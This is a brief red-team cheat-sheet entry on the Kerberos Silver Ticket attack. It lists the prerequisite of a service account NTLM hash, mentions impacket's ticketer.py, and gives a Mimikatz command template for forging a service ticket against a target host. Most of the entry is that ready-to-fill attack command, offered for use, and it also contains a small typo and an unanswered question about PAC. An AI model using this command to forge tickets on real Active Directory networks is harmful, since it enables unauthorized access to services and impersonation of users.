# Silver Ticket Attack
Requires a service account password or NTLM hash, to forge a TGS. Can be avoided with PAC enabled?

impacket ticketer.py

Requirements:
* Service hash

---

## Create a ticket for the service with Mimikatz
`kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET/HOST.DOMAIN.FQDN> /rc4:<NTLM_MACHINE> /service:<SERICE>`